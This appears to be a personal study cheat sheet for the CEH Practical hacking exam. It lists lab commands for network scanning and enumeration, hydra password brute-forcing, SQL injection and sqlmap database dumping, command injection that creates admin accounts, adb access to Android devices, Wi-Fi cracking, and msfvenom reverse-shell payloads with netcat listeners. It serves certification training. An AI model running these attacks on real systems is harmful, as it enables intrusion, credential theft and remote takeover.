# My CEH Practical notes
#  Essential command
```
To Check Ip address Windows--> ipconfig & for Linux-- ifconfig 192.168.77.129
```
#  Scanning Networks (always do--> sudo su) --> To be root
```
1. Nmap scan for alive/active hosts command for 192.189.77.129 is--> nmap -A 192.189.77.0/24 or nmap -T4 -A ip
2. Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command--> nmap -sT -v 10.10.10.16
3. Nmap scan if firewall/IDS is opened, half scan--> nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-->  namp -f 10.10.10.16
4. -A command is used for aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5. Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6. Nmap scan for host discovery or OS--> nmap -O 192.168.92.10 or you can use--> nmap -A 192.168.92.10
7. If host is windows then use this command--> nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8. nmap command for source port manipulation, in this port is given or we use common port-->  nmap -g 80 10.10.10.10
9. To Check all alive host/subnets--> netdiscover -r 192.168.77.0/24 - Use to discover all IP or nmap 192.168.77.0/24
10. Identifiy hostname/Domain name--> nmap -sL 192.168.77.129
11. Scan a list of ip address--> namp -iL ips.txt
12. scan few particular port--> nmap -p 80 443 21 ip/domain name
13. To scan entire subnet--> nmap -sn ip/24
```
# Enumeration
```
1. NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2. NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3. SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4. DNS recon/enum-  dnsrecon -d www.google.com -z
5. FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
6. NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```
#  Stegnography--> Snow , Openstego
```
1. Hide Data Using Whitespace Stegnography--> snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2. To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3. Image Stegnography using Openstego or stegonline
Openstego > use password if required or
stegonline > upload the file and type password
```
# Cryptography 
```
1. VERACRYPT
Open veracrypt > select Any drive J, k, L > Select mention file > Click on mount > enter pass[decrypt=hashes.com] > click ok > Now open the folder and content.
veracrypt >select file>enter pass[decrypt=hashes.com]>open folder and see text
2. BCTextEncoder
Open BCTextEncoder > Past Encoded value > Click on Decode > Decode will Done
```
# Cracking Hashes
Use [Crack Station](https://crackstation.net/) or [Hashes.com](https://hashes.com/en/decrypt/hash)
#  Sniffing
```
1. Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1. Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2. Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3. Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1. Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2. Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3. Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4. Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5. Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL Injections
```
1. Auth Bypass-  hi'OR 1=1 --
2. Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3. Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4. Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5. Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6. For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

7. SQLi:
login>[Q]>console[document.cookie=copy the value]
sqlmap -u "website" --cookie="value" --dbs
sqlmap -u "website" --cookie="value" -D databse --tables
sqlmap -u "website" --cookie="value" -D database --dump -T tablename

SQL:
jsql
[url with id] & attack
sqlmap
sqlmap -u "website" --cookie="value" --dbs
```
# Android
```
nmap ip/24 -Pn
..........
1. nmap ip -sV -p 5555    (Scan for adb port)
2. adb connect IP:5555    (Connect adb with parrot)
3. adb shell              (Access mobile device on parrot)
4. pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If nothing is there then go to Downloads folder using: cd downloads, may need to search others also)
-------------------------------------------
1. nmap -p 5555 ip  (Scan for adb port)
2. adb connect ip:5555  (Connect adb with parrot)
3. adb shell  (Access mobile device on parrot)
4. ls  (Check all file)
5. cd sdcard/
6. ls (To find the folder and file)
7. pwd  (Check file path)
8. exit
10. (Sudo permission)
11. adb pull /file_path_in_mobile
12. check the folder and go to the folder
13. apt install ent (if required)
14 . ent  exicuteable_file ( Check all file entrophy value and find the highest one)
15. sha384sum exicuteable_file (select the required entropy value file)
```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also
DDOS:
wireshark> statistics ipv4>source and destination
filter[tcp.flags.syn==1 and tcp.flags.ack==0] [Most packets=ans]
```
# Find FQDN
```
FQDN = Fully Qualified Domain name ( means Hostname + domain name ) 
1. nmap -sV -sC -v (ip) or
2. nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> -Pn (Find the FQDN in a subnet/network)
```
# Cracking Wi-Fi
```
1. WEP
aircrack-ng [pcap file] (For cracking WEP network)
2. WAP2
i. Aircrack-ng  -w password_wordlist.txt [wificap.PAPC file] if not works use bellow command
ii. aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (WPA2 or other networks by the captured .pcap file)
*** Find BSSID
Open PAPC file using wireshark > Click on any packet > Click on IEEE 802.11 Probs Response, Flag > BSSID will be there
```
# Cracking IOT Devive
```
Analyze IOT traffic using wireshark
Open wireshark --> open capture file --> filter[mqtt]
check publish msg --> mqtt --> check header flags --> msg type 
```
# Privilege escalation
```
1.
nmap -sV ip or nmap -sV -p 22 ip
ssh username@ip and password (login using all credential)
sudo -i or sudo su
cd /
find . -name file.txt
cat /path/file.txt
2.


```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)

Service and version :
nmap -sV -A ip/24

SMB : Bookmarks = smb password cracking and enum4linux cheat sheet
nmap -p 139,445 --script vuln ip
hydra -L user.txt -P pass.txt ip smb (or) Check bookmark
smbclient //(ip)/share
smbclient -L ip
get file and cat file and use bctextencoder if it is encoded

Telnet : Bookmark= password cracking telnet
nmap -vv ip (or) nmap -p 22,23,80,3389 ip
telnet (ip) port(80)
GET /HTTP/1.1
hydra -L user.txt -P pass.txt ip ssh (or) bookmark [AM credentials]
hydra -L user.txt -P pass.txt ip telnet [VM credentials]
ssh username@ip and password
telnet ip and password
msfvenom -p cmd/unix/reverse_netcat lhost=ip(attacker's ip) lport=4444
[paste this payload in target machine]
nc -lnvp 4444 [type this in attacker's machine]
ls
find . -name file.txt
cat /path/file.txt

FTP:
nmap -A -p 21 ip
hydra -L user.txt -P pass.txt ftp://ip
ftp ip and type: username and password

DVWA:
ZAP
payload :
msfconsole
msfvenom -p php/meterpreter/reverse_tcp lhost=ip[from qns] lport=4444 -f
raw > exploit.php
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost ip [upload file]
run [paste it in url]
ls and get the file
```
# CVE / Vulnerability Analysis
```
Openvas And Nessus also used for Vulnerability analysis
Using Nmap
nmap -Pn --script vuln (ip)
Fine and paste cve id to google > go to  NVD site > and get the score
```
# Malware Analysis
```
Analysis Malicious file
DIE > upload file > file info or
PE extraction tools like ghidra> open > upload > details
```
# Remote Access Trojen
```
RAT: Ports[9871,6703]
nmap -p- (ip)
run client.exe [theef]
enter ip,port and connect
file explorer>file.txt
```
